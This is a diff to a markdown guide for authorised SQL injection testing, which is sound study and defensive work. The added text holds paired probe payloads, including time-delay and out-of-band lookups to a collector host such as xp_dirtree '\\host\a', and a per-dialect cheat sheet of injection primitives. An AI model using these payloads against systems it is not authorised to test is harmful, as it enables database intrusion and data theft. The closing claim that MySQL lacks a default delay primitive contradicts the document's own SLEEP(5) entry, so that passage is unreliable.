@@ -4,6 +4,12 @@ Use these as PortSwigger Academy-inspired lane prompts after a likely SQL-backed
 surface exists. They are not lab solutions, not an exhaustive methodology, and
 not permission to exceed scope.
 
+**Mechanism.** The query is assembled as a string and handed to a parser. A bug
+exists when the quoting, comment, or escape handling the defense models differs
+from what the database actually parses. Each family below is a bet about that
+difference: find which clause the input lands in, then which dialect is parsing
+it, and the payload follows from the pair.
+
 ## Official References
 
 - SQL injection topic: https://portswigger.net/web-security/sql-injection
@@ -13,15 +19,22 @@ not permission to exceed scope.
 
 ## Detection Lanes
 
-- single-quote parser anomaly
-- escaped quote control
-- numeric expression control
-- boolean true/false pair
-- equivalent-value pair
-- time delay pair
-- OAST interaction pair
-- syntax that restores the original value
-- syntax that produces a deliberately different value
+Each lane is a paired probe: a control that should behave normally and a test
+that should differ only if input reaches the parser.
+
+| Lane | Control | Test | Reads as injection when |
+|---|---|---|---|
+| single-quote parser anomaly | `value` | `value'` | the quote alone changes status, body, or error |
+| escaped quote control | `value'` | `value''` | the doubled quote restores normal behavior |
+| numeric expression | `id=2` | `id=3-1` | the server resolves the arithmetic |
+| boolean pair | `' AND '1'='1` | `' AND '1'='2` | the two differ from each other |
+| equivalent-value pair | `' AND 1=1-- ` | `' AND 1=2-- ` | same, in a comment-terminated form |
+| time delay pair | a zero-delay condition | a true-condition delay | the delay tracks the condition over repeats |
+| OAST pair | a benign hostname | a controlled collector hostname | the collector sees a DB-originated lookup |
+
+Prefer a restoring form (`''`, `'||'`, a closing comment) before a breaking
+one: restoring the original value proves parsing without leaving a broken query
+in logs.
 
 ## Query Context Lanes
 
@@ -52,16 +65,27 @@ not permission to exceed scope.
 
 ## Dialect Seeds
 
-- comment syntax differences
-- string concatenation differences
-- substring syntax
-- database version functions
-- metadata table names
-- conditional expression syntax
-- conditional error primitives
-- time-delay functions
-- stacked-query support
-- OAST/DNS lookup primitives
+A payload that works on one dialect and not another **is** the fingerprint, so
+run these as discriminators rather than as a list to exhaust. Oracle needs a
+`FROM` clause (`FROM dual`) on every `SELECT`; MySQL needs whitespace after
+`-- `. Those two quirks alone separate most stacks.
+
+| Primitive | PostgreSQL | MySQL | MSSQL | Oracle | SQLite |
+|---|---|---|---|---|---|
+| line comment | `--`, `/**/` | `-- ` (trailing space), `#` | `--`, `/**/` | `--`, `/**/` | `--`, `/**/` |
+| concatenate | `'a'\|\|'b'` | `CONCAT('a','b')`, `'a' 'b'` | `'a'+'b'` | `'a'\|\|'b'` | `'a'\|\|'b'` |
+| substring | `SUBSTRING(s FROM 1 FOR 1)` | `SUBSTRING(s,1,1)` | `SUBSTRING(s,1,1)` | `SUBSTR(s,1,1)` | `SUBSTR(s,1,1)` |
+| version | `version()` | `@@version` | `@@version` | `banner FROM v$version` | `sqlite_version()` |
+| metadata | `information_schema.tables` | `information_schema.tables` | `information_schema.tables` | `all_tables`, `all_tab_columns` | `sqlite_master` |
+| conditional | `CASE WHEN c THEN a ELSE b END` | `IF(c,a,b)` | `CASE WHEN ... END` | `CASE WHEN ... END` | `CASE WHEN ... END` |
+| conditional error | `1/0`, `CAST('x' AS int)` | — | `1/0` | `TO_CHAR(1/0)` | — |
+| time delay | `pg_sleep(5)` | `SLEEP(5)` | `WAITFOR DELAY '0:0:5'` | `dbms_pipe.receive_message(('a'),5)` | none |
+| stacked queries | `;` supported | usually blocked by the driver | `;` supported | not supported | driver-dependent |
+| OAST lookup | `dblink`/`COPY` (privileged) | `LOAD_FILE('\\\\host\\a')` (Windows) | `xp_dirtree '\\host\a'` | `UTL_INADDR`, `EXTRACTVALUE` XXE | none |
+
+SQLite and MySQL have no reliable delay primitive in a default configuration,
+so a missing delay is a statement about the dialect, not about injectability.
+Fall back to a boolean or error lane before concluding the vector is inert.
 
 ## Safe Proof Ideas
 
